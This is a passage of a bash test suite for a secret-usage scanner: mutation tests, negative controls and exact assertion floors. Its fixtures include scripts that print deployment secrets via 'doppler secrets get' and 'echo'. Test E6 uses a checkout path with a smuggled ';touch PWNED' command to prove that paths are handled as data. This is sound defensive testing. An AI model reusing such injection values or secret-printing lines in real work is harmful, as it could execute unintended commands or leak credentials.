pcase K16 scripts/k16.sh WEBHOOK_DEPLOY_SECRET sink "twin: a doc comment holding 'doppler run' text and an unrelated \$(...) is not a read (only the expansion counts)"
# code under the doc prefixes (N2): a shebang makes any file code; Makefile and the new extensions are listed
pr_mk docs/pull; printf '#!/usr/bin/env bash\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n' > "$PT/docs/pull"
pcase SH1 docs/pull WEBHOOK_DEPLOY_SECRET tier-a "an extension-less script with a shebang under docs/ is code"
printf '#!/usr/bin/env zsh\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/docs/pull.zsh"
pcase SH2 docs/pull.zsh WEBHOOK_DEPLOY_SECRET sink "a .zsh under docs/ is code"
pr_mk "$KBN/x/Makefile"; printf 'run:\n\t@echo $$WEBHOOK_DEPLOY_SECRET\n' > "$PT/$KBN/x/Makefile"
pcase SH3 "$KBN/x/Makefile" WEBHOOK_DEPLOY_SECRET sink "a Makefile under knowledge-base/ is code"
printf 'WEBHOOK_DEPLOY_SECRET in a text note\n' > "$PT/docs/pull.txt"
pcase SH4 docs/pull.txt WEBHOOK_DEPLOY_SECRET ABSENT "twin: a .txt without a shebang under docs/ is prose"
printf 'WEBHOOK_DEPLOY_SECRET is rotated monthly\n' > "$PT/docs/notes"
pcase SH5 docs/notes WEBHOOK_DEPLOY_SECRET ABSENT "twin: an extension-less file without a shebang under docs/ is prose"
printf '#!/usr/bin/env bash\necho "${CF_ACCESS_CLIENT_ID}"\n' > "$PT/$KBN/x/pull"
pcase SH6 "$KBN/x/pull" CF_ACCESS_CLIENT_ID sink "an extension-less script with a shebang under knowledge-base/ is code"
pr_commit
pr_emit pt "$T/trio.py" "$T/probe/pt.rows"
if [ -s "$T/probe/pt.rows" ]; then pass "PT0: the classification table repo produced rows ($(wc -l < "$T/probe/pt.rows") rows)"; else fail "PT0: the classification table repo produced rows" "$(head -c 300 "$T/probe/pt.rows.err")"; fi
while IFS=$'\t' read -r _id _f _n _want _desc; do
  pr_expect "$T/probe/pt.rows" "PT $_id: $_desc" "$_f" "$_n" "$_want"
done < "$PC"
_anc_bad=""
for _a in $CM_ANCHORS; do IFS='|' read -r _af _an _ac <<< "$_a"; [ "$(pr_class "$T/probe/pt.rows" "$_af" "$_an")" = "$_ac" ] || _anc_bad="$_anc_bad $_af"; done
if [ -z "$_anc_bad" ]; then pass "PTA: the scanner-mutant anchor rows hold on the unmutated scanner"; else fail "PTA: the scanner-mutant anchor rows hold on the unmutated scanner" "off:$_anc_bad"; fi

# scanner-branch mutants: an edited COPY of the scanner must flip the named case
CMPROBE=pt
cmut cm1 "the NUL branch: a NUL-bearing file is skipped as binary" '    if b"\0" in raw:
' '    if b"\0" in raw:
        continue
' scripts/nul1.sh WEBHOOK_DEPLOY_SECRET tier-a ABSENT
cmut cm2 "the code-extension carve-out under knowledge-base/ and docs/: everything there is skipped" 'if rel in (SUITE_REL, BASELINE_REL) or kb_prose(rel, full):' 'if rel in (SUITE_REL, BASELINE_REL) or rel.startswith(EXCLUDED_PREFIXES):' docs/a.sh WEBHOOK_DEPLOY_SECRET tier-a ABSENT
cmut cm3 "the doppler secrets get|download read shape is dropped" 'bool(R_DOP_RUN.search(joined) or R_DOP_SEC.search(joined) or R_DOP_RUN.search(code) or R_DOP_SEC.search(code))' 'bool(R_DOP_RUN.search(joined) or R_DOP_RUN.search(code))' scripts/n1.sh WEBHOOK_DEPLOY_SECRET tier-a sink
cmut cm4 "the doppler run read shape is dropped" 'bool(R_DOP_RUN.search(joined) or R_DOP_SEC.search(joined) or R_DOP_RUN.search(code) or R_DOP_SEC.search(code))' 'bool(R_DOP_SEC.search(joined) or R_DOP_SEC.search(code))' scripts/n5.sh WEBHOOK_DEPLOY_SECRET tier-a sink
cmut cm5 "the \${!var} indirection read shape is dropped" 'return bool(an["reads"] or an["gen_read"] or an["alias_reads"] or an["indirect"])' 'return bool(an["reads"] or an["gen_read"] or an["alias_reads"])' scripts/n4.sh CF_ACCESS_CLIENT_ID tier-a sink
cmut cm6 "the terraform output -raw read shape is dropped" 'return bool(an["reads"] or an["gen_read"] or an["alias_reads"] or an["indirect"])' 'return bool(an["reads"] or an["gen_read"] or an["indirect"])' tests/scripts/lib/r5.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET tier-a ABSENT
cmut cm7 "the secrets.NAME / secrets['NAME'] read shape is dropped" 'for m in R_SECRETS.finditer(joined):' 'for m in []:' tests/scripts/lib/r7.sh WEBHOOK_DEPLOY_SECRET tier-a ABSENT
cmut cm8 "the expansion fragments of a comment line are dropped (a comment is dropped whole)" '            if frags:
                keep.append(" ".join(frags))
' '' scripts/k1.sh WEBHOOK_DEPLOY_SECRET sink ABSENT
cmut cm9 "// becomes a comment marker in every language and # in JS/TS" '(s.startswith("//") if js else s.startswith("#"))' '(s.startswith("#") or s.startswith("//"))' scripts/k2.sh WEBHOOK_DEPLOY_SECRET sink ABSENT
cmut cm10 "the ALIAS left boundary is dropped (ci_ssh_ spellings match)" 'ALIAS_A = re.compile(r"(?<![A-Za-z0-9_])(?:TF_VAR_)?access_service_token_client_' 'ALIAS_A = re.compile(r"(?:TF_VAR_)?access_service_token_client_' scripts/a1.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT tier-a
cmut cm11 "the ALIAS resource label is widened from deploy to any" 'cloudflare_zero_trust_access_service_token\.deploy\.client_' 'cloudflare_zero_trust_access_service_token\.[A-Za-z0-9_]+\.client_' apps/web-platform/infra/a2.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT tier-a
cmut cm12 "the trailing-|| join is dropped" 'joined = ORJOIN.sub("|| ", CONT.sub(" ", code))' 'joined = CONT.sub(" ", code)' scripts/f1.sh FALLBACK:SOME_OTHER_CRED tier-a ABSENT
cmut cm13 "the strict continuation join for split names is dropped" 'strict = CONT_STRICT.sub("", code)' 'strict = code' scripts/tn4.sh WEBHOOK_DEPLOY_SECRET sink ABSENT
cmut cm14 "the workflow-level naming check is dropped" 'wl = bool(FAM.search(json.dumps({k: v for k, v in doc.items() if k != "jobs"}, default=str)))' 'wl = False' .github/workflows/w7.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm15 "no naming job is read as proof (the empty case returns True)" '    if not naming:
        return False' '    if not naming:
        return True' .github/workflows/w6.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm16 "unparseable YAML is read as proof" '        doc = yaml.safe_load(text)
    except Exception:
        return False' '        doc = yaml.safe_load(text)
    except Exception:
        return True' .github/workflows/w4.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm17 "a document with no jobs is read as proof" '    if not isinstance(doc, dict) or not isinstance(doc.get("jobs"), dict):
        return False' '    if not isinstance(doc, dict) or not isinstance(doc.get("jobs"), dict):
        return True' .github/workflows/w5.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm18 "the expression-arm extraction of the old classifier is reintroduced (the quoted literal inside \${{ }} counts)" 'e = env_literal(b.get("environment")) if "environment" in b else None' 'e = (re.findall(r"'"'"'([^'"'"']*)'"'"'", str(b.get("environment"))) or [None])[0] if "environment" in b else None' .github/workflows/w1.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm19 "composite actions fall through to sink" '    if ACTION.fullmatch(rel):
        return "tier-a"
' '' .github/actions/c1/action.yml CF_ACCESS_CLIENT_ID tier-a sink
cmut cm20 "the Tier-B set membership test is dropped" '        if e is None or e not in ENVS:' '        if e is None:' .github/workflows/w12.yml CF_ACCESS_CLIENT_ID tier-a tier-b
cmut cm21 "an exempt read-shape file earns rows only for the Access-token alias, not for its names" '        return {(rel, n) for n in an["names"]} | {(rel, n) for n in an["alias_reads"]}' '        return {(rel, n) for n in an["alias_reads"]}' tests/scripts/lib/r1.sh WEBHOOK_DEPLOY_SECRET tier-a ABSENT
cmut cm22 "the doppler command-syntax rule is replaced by the old 'up to six words between doppler and the subcommand' rule" '_FLAGS = r"""(?:""" + _SEP + r"""-""" + _TOK + r"""+(?:""" + _SEP + r"""(?!-)""" + _TOK + r"""+)?)*"""' '_FLAGS = r"""(?:""" + _SEP + _TOK + r"""+){0,6}?"""' scripts/pro1.sh WEBHOOK_DEPLOY_SECRET sink tier-a
cmut cm23 "the unbraced \$NAME expansion is dropped from the comment rule" '|\$\([^\n]*|\$[A-Za-z_][A-Za-z0-9_]*")' '|\$\([^\n]*")' scripts/k11.sh WEBHOOK_DEPLOY_SECRET sink ABSENT
cmut cm24 "the shebang sniff under the doc prefixes is dropped" '            return fh.read(2) != b"#!"' '            return True' docs/pull WEBHOOK_DEPLOY_SECRET tier-a ABSENT
cmut cm25 "the Makefile basename is dropped from the code names under the doc prefixes" 'KB_CODE_NAMES = {"Makefile"}' 'KB_CODE_NAMES = set()' "$KBN/x/Makefile" WEBHOOK_DEPLOY_SECRET sink ABSENT
cmut cm26 "a comment line holding an expansion is kept WHOLE (its inert text counts as code again)" 'keep.append(" ".join(frags))' 'keep.append(ln)' scripts/k16.sh WEBHOOK_DEPLOY_SECRET sink tier-a
cmut cm27 "the option flags before the doppler subcommand are no longer recognised" '_FLAGS = r"""(?:""" + _SEP + r"""-""" + _TOK + r"""+(?:""" + _SEP + r"""(?!-)""" + _TOK + r"""+)?)*"""' '_FLAGS = r""""""' scripts/n9.sh WEBHOOK_DEPLOY_SECRET tier-a sink
flush_pending
eval_live

# ── D5: every seam is refused under CI; the audit of this file's own source is live ───────────────────────
_seam_probe() { # <seam> <ci:true|false> -> prints "<rc>|<stderr first line>"
  local out rc
  out="$(env -u GITHUB_ACTIONS -u TRIO_TODAY -u TRIO_BASE_REF -u TRIO_BASELINE -u TRIO_REPO_ROOT -u TRIO_ALLOW_NO_BASE -u RF_PY -u RF_REF -u RF_TODAY -u RF_EVENT -u RF_EVENTREF -u RF_ENVS -u RF_SIB GITHUB_ACTIONS="$2" "$1=x" bash "$SUITE" --seams-check 2>&1 >/dev/null)"; rc=$?
  printf '%s|%s' "$rc" "${out%%$'\n'*}"
}
_m55_bad=""
for _sm in $SEAMS; do
  _r="$(_seam_probe "$_sm" true)"
  case "$_r" in 1\|"FAIL SETUP: $_sm is set under GITHUB_ACTIONS=true"*) : ;; *) _m55_bad="$_m55_bad $_sm(${_r:0:80})" ;; esac
  MUTANTS_RUN=$((MUTANTS_RUN + 1))
done
if [ -z "$_m55_bad" ]; then pass "m55: FAIL SETUP for each of the $(printf '%s' "$SEAMS" | wc -w | tr -d ' ') seams under GITHUB_ACTIONS=true (accident-proofing, not authorization)"; else fail "m55: FAIL SETUP for each seam under GITHUB_ACTIONS=true" "not refused:$_m55_bad"; fi
_c55_bad=""
for _sm in TRIO_TODAY TRIO_BASE_REF TRIO_BASELINE TRIO_REPO_ROOT TRIO_ALLOW_NO_BASE RF_PY RF_REF; do
  _r="$(env -u GITHUB_ACTIONS "$_sm=x" bash "$SUITE" --seams-check 2>&1)"; _rc=$?
  [ "$_rc" -eq 0 ] && [ "$_r" = "SEAMS OK" ] || _c55_bad="$_c55_bad $_sm"
done
_r="$(env -u TRIO_TODAY -u TRIO_BASE_REF -u TRIO_BASELINE -u TRIO_REPO_ROOT -u TRIO_ALLOW_NO_BASE -u RF_PY -u RF_REF -u RF_TODAY -u RF_EVENT -u RF_EVENTREF -u RF_ENVS -u RF_SIB GITHUB_ACTIONS=true bash "$SUITE" --seams-check 2>&1)"; _rc=$?
[ "$_rc" -eq 0 ] && [ "$_r" = "SEAMS OK" ] || _c55_bad="$_c55_bad ci-without-seams"
if [ -z "$_c55_bad" ]; then pass "c55: the seams are honoured or scrubbed locally, and CI without seams is fine"; else fail "c55: the seams are honoured or scrubbed locally, and CI without seams is fine" "refused:$_c55_bad"; fi
# the audit: a seam the source uses but SEAMS does not declare fails (a copy of this suite with one more seam appended)
mkdir -p "$T/seamcopy"; cp "$SUITE" "$T/seamcopy/x.sh"
printf '\n: "$%s"\n' '{TRIO_NEWSEAM:-}' >> "$T/seamcopy/x.sh"
MUTANTS_RUN=$((MUTANTS_RUN + 1))
_r="$(env -u GITHUB_ACTIONS bash "$T/seamcopy/x.sh" --seams-check 2>&1)"; _rc=$?
if [ "$_rc" -eq 1 ] && [ "${_r#*TRIO_NEWSEAM}" != "$_r" ]; then pass "m55b: a seam added to the source without being declared in SEAMS fails the --seams-check audit"; else fail "m55b: an undeclared seam fails the --seams-check audit" "rc=$_rc: ${_r:0:200}"; fi

# ── the harness's own controls (E3/E4): helper internals have negative controls ────────────────────────
score_of() { # <cmd...> -> "<passes delta> <fails delta>|<output>"  (the command runs with MUT_SYNC=1 in a subshell)
  ( p0=$passes; f0=$fails; MUTANTS_RUN=0; MUT_SYNC=1; "$@" > "$T/nc.out" 2>&1; printf '%s %s|%s' "$((passes - p0))" "$((fails - f0))" "$(cat "$T/nc.out")" )
}
nc_expect() { # <label> <score> <substring that must be in the failure output>
  local df="${2#* }"; df="${df%%|*}"
  case "$df|$2" in "1|"*"|"*"$3"*) pass "$1" ;; *) fail "$1" "scored: ${2:0:400}" ;; esac
}
RED_CONSUMER='name: new\njobs:\n  j:\n    runs-on: x\n    env:\n      S: ${{ secrets.WEBHOOK_DEPLOY_SECRET }}\n'
prep nc1
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
landed_dir
nc_expect "nc1: green() over a RED fixture is scored FAIL" "$(score_of green nc1 'a red fixture under green')" "FAIL nc1"
prep nc2
printf 'landed' > "$D/landed"
nc_expect "nc2: green() with a wrong want is scored FAIL" "$(score_of green nc2 'wrong want' 'no-such-text-anywhere')" "is not in the output"
prep nc3
printf 'landed' > "$D/landed"
nc_expect "nc3: green() with a wrong arm is scored FAIL" "$(score_of green nc3 'wrong arm' '' head1)" "wanted head1"
prep nc3b
printf 'landed' > "$D/landed"
nc_expect "nc3b: green() with a missing annotation is scored FAIL" "$(score_of green nc3b 'wrong annotation' '' '' '::warning::no-such')" "annotation"
prep nc4
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
landed_dir
nc_expect "nc4: mutant() with a wrong want is scored FAIL" "$(score_of mutant nc4 T1 'wrong want' 'no-such-reason')" "not for the named reason"
prep nc5
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
landed_dir
nc_expect "nc5: mutant() with a wrong arm is scored FAIL" "$(score_of mutant nc5 T1 'wrong arm' '.github/workflows/new.yml' head1)" "wanted head1"
printf '#!/usr/bin/env python3\nimport sys\nsys.exit(1)\n' > "$T/nc-crash.py"
printf '#!/usr/bin/env python3\nprint("ok\\tT0: x\\t")\nprint("ok\\tT1: y\\t")\n' > "$T/nc-short.py"
prep nc6
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
knobs RF_PY="$T/nc-crash.py"; landed_dir
nc_expect "nc6: a CRASHING scanner is UNRESOLVED, not a kill" "$(score_of mutant nc6 T1 'crashing scanner')" "UNRESOLVED"
prep nc7
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
knobs RF_PY="$T/nc-short.py"; landed_dir
nc_expect "nc7: a scanner printing a SHORT row set (rc 0) is UNRESOLVED, not a kill" "$(score_of mutant nc7 T1 'short row set')" "UNRESOLVED"
prep nc8
printf '%b' "$RED_CONSUMER" > "$D/fx/.github/workflows/new.yml"
landed_dir
nc_expect "nc8: a named row that does not exist is scored FAIL (a harness bug, not a kill)" "$(score_of mutant nc8 T99 'absent row')" "is absent from a complete row set"
prep nc9
bl_add .github/workflows/web-platform-release.yml WEBHOOK_DEPLOY_SECRET tier-a 2026-11-30 '#9294:PR-3'
landed_dir
nc_expect "nc9: a want that is a substring of the row's own LABEL is scored FAIL (nominal attribution)" "$(score_of mutant nc9 T5 'nominal want' 'no duplicate key')" "nominal attribution"
prep nc10
bl_add .github/workflows/web-platform-release.yml WEBHOOK_DEPLOY_SECRET tier-a 2026-11-30 '#9294:PR-3'
landed_dir
nc_expect "nc10: a want present only in the row LABEL (not the detail) cannot satisfy mutant()" "$(score_of mutant nc10 T5 'label-only want' 'a #9294:PR-n tag equal to the computed group')" "nominal attribution"
# judge_cmut controls (E3): a scanner-branch mutant is a kill only when the edited scanner ran cleanly, kept its anchors and flipped the named case
# to the NAMED class. Each control below is scored in a subshell and must come out as exactly one FAIL carrying the stated reason.
CMPROBE=pt
nc_expect "nc11: a scanner copy with a SYNTAX ERROR is UNRESOLVED, not a kill" "$(score_of cmut nc11 'syntax error' 'WARN_DAYS = 21' 'WARN_DAYS = (' scripts/n2.sh WEBHOOK_DEPLOY_SECRET sink ABSENT)" "UNRESOLVED (a crash is not a kill)"
nc_expect "nc12: an edit that does not apply to the scanner copy is scored FAIL at the landing gate" "$(score_of cmut nc12 'unlanded edit' 'no-such-text-in-the-scanner' 'x' scripts/n2.sh WEBHOOK_DEPLOY_SECRET sink ABSENT)" "the edit did not apply exactly once"
nc_expect "nc13: a landed edit that changes nothing is scored FAIL at the flip test (a flip test forced true would pass it)" "$(score_of cmut nc13 'benign edit' 'WARN_DAYS = 21' 'WARN_DAYS = 21  # benign' scripts/n2.sh WEBHOOK_DEPLOY_SECRET sink tier-a)" "unchanged under the mutated scanner"
nc_expect "nc14: a flip to a class other than the declared one is scored FAIL" "$(score_of cmut nc14 'wrong new class' '            if frags:
                keep.append(" ".join(frags))
' '' scripts/k1.sh WEBHOOK_DEPLOY_SECRET sink tier-a)" "but the edit was declared to produce tier-a"
nc_expect "nc15: a scanner copy that exits 0 with an EMPTY row set loses its anchors and is UNRESOLVED, not a kill" "$(score_of cmut nc15 'empty row set' 'paths = sorted({os.fsdecode(p) for p in _r.stdout.split(b"\0") if p})' 'paths = []' scripts/n2.sh WEBHOOK_DEPLOY_SECRET sink ABSENT)" "anchor rows missing"
# E8: the live-scan handshake. A SLOW scanner is awaited to completion with no `wait` on a non-child and no stderr noise; a scan that was already reaped by a
# bare `wait` is still read; a scanner crash is surfaced; a child that vanished without publishing an rc is 99.
cp "$T/trio.py" "$T/slow.py"
edit "$T/slow.py" 'import sys, os, re, datetime, argparse, subprocess, json, ast' 'import time
time.sleep(3)
import sys, os, re, datetime, argparse, subprocess, json, ast'
_s0=$SECONDS
GITQ_ISO=1 RF_PY="$T/slow.py" bg_scan "$FX" "$FX/$BASELINE_REL" "$T/slow.tsv" "$T/slow.rc"
_e8_rc="$(await_rc "$BG_PID" "$T/slow.rc" 2> "$T/slow.noise")"; _e8_dt=$((SECONDS - _s0))
if [ "$_e8_rc" = "0" ] && [ "$_e8_dt" -ge 2 ] && [ "$(nrows "$T/slow.tsv")" -eq "$NROWS" ] && all_ok "$T/slow.tsv" && [ ! -s "$T/slow.noise" ]; then
  pass "E8a: a slow live scan (3 s sleep in a scanner copy) is awaited to completion: rc 0, all $NROWS rows green, no stderr noise"
else fail "E8a: a slow live scan is awaited to completion without noise" "rc=$_e8_rc after ${_e8_dt}s rows=$(nrows "$T/slow.tsv" 2>/dev/null) noise=$(head -c 200 "$T/slow.noise")"; fi
GITQ_ISO=1 bg_scan "$FX" "$FX/$BASELINE_REL" "$T/fast.tsv" "$T/fast.rc"
wait
_e8_rc="$(await_rc "$BG_PID" "$T/fast.rc" 2>&1)"
if [ "$_e8_rc" = "0" ]; then pass "E8b: a scan already reaped by a bare wait is read from its rc file, silently (no 'not a child of this shell')"
else fail "E8b: a scan already reaped by a bare wait is read from its rc file, silently" "got '$_e8_rc'"; fi
GITQ_ISO=1 RF_PY="$T/nc-crash.py" bg_scan "$FX" "$FX/$BASELINE_REL" "$T/crash.tsv" "$T/crash.rc"
_e8_rc="$(await_rc "$BG_PID" "$T/crash.rc" 2>&1)"
if [ "$_e8_rc" = "1" ]; then pass "E8c: a crashing scanner's rc (1) is surfaced, not swallowed"; else fail "E8c: a crashing scanner's rc is surfaced" "got '$_e8_rc'"; fi
( exit 0 ) & _e8_pid=$!
wait "$_e8_pid"
_e8_rc="$(await_rc "$_e8_pid" "$T/never.rc" 2>&1)"
if [ "$_e8_rc" = "99" ]; then pass "E8d: a child that is gone without publishing an rc is 99 (A0 FAIL), never an indefinite wait"; else fail "E8d: a child gone without an rc is 99" "got '$_e8_rc'"; fi
# E3: no registered mutant's want was satisfied by its row's own label
flush_pending
if [ -z "$NOMINAL_WANTS" ]; then pass "E3: no mutant's want is a substring of its own row's label"; else fail "E3: no mutant's want is a substring of its own row's label" "nominal:$NOMINAL_WANTS"; fi

# (4) Per-root floors trip in the fail direction and stay quiet in the pass direction.
_fl_hi="$(roots_below_floor "$T/ctl.tsv.err" ".github/workflows:99 .github/actions:1 .github/scripts:1 scripts:3 plugins:2 apps/web-platform:9")"
_fl_ok="$(roots_below_floor "$T/ctl.tsv.err" ".github/workflows:6 .github/actions:1 .github/scripts:1 scripts:3 plugins:2 apps/web-platform:9")"
if [ -n "$_fl_hi" ] && [ -z "$_fl_ok" ]; then pass "C5: the per-root floor check reds a root below its floor (.github/workflows 6<99) and is quiet at the measured counts"
else fail "C5: the per-root floor check reds a root below its floor and is quiet at the measured counts" "hi='$_fl_hi' ok='$_fl_ok'"; fi
# (4b) A population that git cannot enumerate is FAIL SETUP (rc 3), never an empty scan.
mkdir -p "$T/nogit"; printf 'x' > "$T/nogit/a"
GIT_CEILING_DIRECTORIES="$T" py3 "$T/trio.py" --repo "$T/nogit" --baseline "$FX/$BASELINE_REL" --today "$FIXTODAY" --envs "$FIXENVS" > /dev/null 2> "$T/nogit.err"; _ng=$?
if [ "$_ng" -eq 3 ] && grep -q '^FAIL SETUP: git ls-files failed' "$T/nogit.err"; then pass "C6: a repo git cannot enumerate is FAIL SETUP (rc 3), not an empty green scan"
else fail "C6: a repo git cannot enumerate is FAIL SETUP (rc 3), not an empty green scan" "rc=$_ng $(head -c 200 "$T/nogit.err")"; fi
# (5) A mutation that did not land is detected (the landed check itself is live).
prep c4
landed_dir
if [ "$(cat "$D/landed")" = "unchanged" ]; then pass "C4: an unedited fixture copy reads as 'unchanged' (the landed check can fail)"
else fail "C4: an unedited fixture copy reads as 'unchanged' (the landed check can fail)" "read: $(cat "$D/landed")"; fi
# (6) R20: the mutant runner must score a no-op edit FAIL (a runner that always passed would make every row above vacuous).
prep m60
landed_dir   # unchanged: the landing gate must fire
_p0=$passes; _f0=$fails
_nop1="$( (MUTANTS_RUN=0; MUT_SYNC=1; mutant m60 T1 "no-op" >/dev/null 2>&1; printf '%s %s %s' "$passes" "$fails" "${FAILURES[${#FAILURES[@]}-1]:-}") )"
printf 'landed' > "$D/landed"   # forced past the landing gate: nothing was edited, so the named row cannot be RED
_nop2="$( (MUTANTS_RUN=0; MUT_SYNC=1; mutant m60 T1 "no-op" >/dev/null 2>&1; printf '%s %s %s' "$passes" "$fails" "${FAILURES[${#FAILURES[@]}-1]:-}") )"
MUTANTS_RUN=$((MUTANTS_RUN + 1))
case "$_nop1" in "$_p0 $((_f0 + 1)) m60 lands: no-op") pass "m60 lands: the runner scores an UNCHANGED copy as FAIL at the landing gate" ;; *) fail "m60 lands: the runner scores an UNCHANGED copy as FAIL at the landing gate" "read: $_nop1" ;; esac
case "$_nop2" in "$((_p0 + 1)) $((_f0 + 1)) m60: T1 is RED") pass "m60: the runner scores a no-op edit as FAIL at the verdict gate (the named row stayed ok)" ;; *) fail "m60: the runner scores a no-op edit as FAIL at the verdict gate" "read: $_nop2" ;; esac

# ── E6: a hostile checkout path is data, never code ──────────────────────────────────────────────────
PREP_BASE="$T/sp ace;touch PWNED"
prep e6
cp "$T/trio.py" "$D/trio.py"
knobs RF_PY="$D/trio.py" RF_ENVS="infra-privileged,deploy-channel"
printf 'landed' > "$D/landed"
green e6 "E6: the control run is green from a fixture path containing a space and a ';touch PWNED' fragment (knobs and the scanner path are quoted)"
PREP_BASE="$T/mut"
flush_pending
if [ ! -e "$T/PWNED" ] && [ ! -e "$T/sp ace;touch PWNED/PWNED" ] && [ ! -e "$T/sp ace;touch PWNED/e6/PWNED" ] && [ ! -e "$PWD/PWNED" ]; then pass "E6b: no fragment of the hostile path was executed"; else fail "E6b: no fragment of the hostile path was executed" "a PWNED file exists"; fi
if ! awk '/[\001-\010\013-\037\177]/ {bad = 1} END {exit bad ? 0 : 1}' "$T/mut/m82/out" 2>/dev/null; then pass "E6c: the T1 line for a file name with ESC and CR carries no control character"; else fail "E6c: the T1 line for a file name with ESC and CR carries no control character" "a control character reached the row output"; fi

# Floors. MUTANT_FLOOR is exact.
MUTANT_FLOOR=208
if [ "$MUTANTS_RUN" -lt "$MUTANT_FLOOR" ]; then
  printf 'FAIL MUTANT FLOOR: only %s mutants executed, floor is %s -- a matrix row did not land or was deleted.\n' "$MUTANTS_RUN" "$MUTANT_FLOOR" >&2
  exit 1
fi
if [ "$MUTANTS_RUN" -gt "$MUTANT_FLOOR" ]; then
  printf 'FAIL MUTANT FLOOR: %s mutants executed but MUTANT_FLOOR is %s -- it is exact; raise it to %s.\n' "$MUTANTS_RUN" "$MUTANT_FLOOR" "$MUTANTS_RUN" >&2
  exit 1
fi
# Assertion FLOOR (exact), equal to the number of assertions this suite makes.
_ran=$((passes + fails))
FLOOR=603
if [ "$_ran" -lt "$FLOOR" ]; then
  printf 'FAIL ANTI-VACUITY: only %s assertions ran, floor is %s -- cases were deleted or the suite exited early.\n' "$_ran" "$FLOOR" >&2
  exit 1
fi
if [ "$_ran" -gt "$FLOOR" ]; then
  printf 'FAIL ANTI-VACUITY: %s assertions ran but FLOOR is %s -- it is exact; raise it to %s.\n' "$_ran" "$FLOOR" "$_ran" >&2
  exit 1
fi
if [ "${#FAILURES[@]}" -ne "$fails" ]; then
  printf 'FAIL LEDGER: %s failures counted but %s recorded\n' "$fails" "${#FAILURES[@]}" >&2; exit 1
fi
printf '\n=== trio-baseline-census: %d passed, %d failed ===\n\n' "$passes" "$fails"
_REACHED_VERDICT=1
exit $(( ${#FAILURES[@]} > 0 ))
